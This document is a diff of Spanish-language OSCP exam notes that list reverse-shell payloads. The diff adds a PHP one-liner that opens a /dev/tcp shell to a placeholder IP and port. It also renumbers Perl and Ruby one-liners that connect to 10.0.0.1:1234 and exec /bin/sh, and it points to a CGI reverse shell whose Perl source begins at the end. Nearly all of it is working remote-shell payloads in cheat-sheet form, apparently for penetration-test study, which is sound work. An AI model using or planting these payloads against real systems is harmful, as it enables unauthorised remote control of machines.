@@ -13,11 +13,16 @@ Previamente `export PAYLOAD=<nombre-payload>; export LHOST=<IP-local>; export LP
 
 3) PHP  --> `$OSCP/explotacion/reverse-shells/php-reverse/generator.sh $LHOST $LPORT`
 
-4) PERL --> `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+2) PHP simplificada --> 
+<pre>
+<?php echo shell_exec("exec 97<>/dev/tcp/IP_LOCAL/PUERTO;sh <&97 >&97 2>&97; id");?>
+</pre>
 
-5) RUBY --> `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+5) PERL --> `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
-6) CGI --> https://github.com/ferreirasc/oscp/blob/master/payloads/reverse_shell.cgi 
+6) RUBY --> `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+
+7) CGI --> https://github.com/ferreirasc/oscp/blob/master/payloads/reverse_shell.cgi 
 <pre>
 #!/usr/bin/perl -w
 use strict;
